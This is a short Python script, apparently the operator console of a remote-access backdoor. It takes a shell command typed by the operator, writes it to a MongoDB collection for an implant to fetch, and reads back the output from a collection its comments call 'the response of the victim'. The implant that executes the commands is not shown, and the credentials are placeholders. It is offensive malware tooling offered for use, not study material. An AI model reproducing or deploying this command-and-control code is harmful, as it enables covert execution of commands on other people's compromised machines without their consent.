from email.mime import base
import pymongo
import base64
cluster = pymongo.MongoClient(YOUR MONGOCLIENT CREDENTIALS)


db = cluster.get_database(THE NAME OF YOUR DATABASE)

collection = db.get_collection(THE NAME FOR COLLECTION (HERE WILL BE STORED THE COMMANDS))


def inserindo_comandos(comando):
    comandos = {
        'commands': f'{comando}'
    }
    collection.insert_one(comandos)




def lendo_resposta():

    collection2 = db.get_collection(HERE THE COLLECTION FOR THE RESPONSE OF THE VICTIM)
    busca = collection2.find({})
    for x in busca:
        palavra = x['output']
        print(palavra)
    collection.delete_many({})


    
# input your command
comando = str(input("Digite o comando:\n"))
inserindo_comandos(comando)


# READ THE RESPONSE OF THE VICTIM
#lendo_resposta()

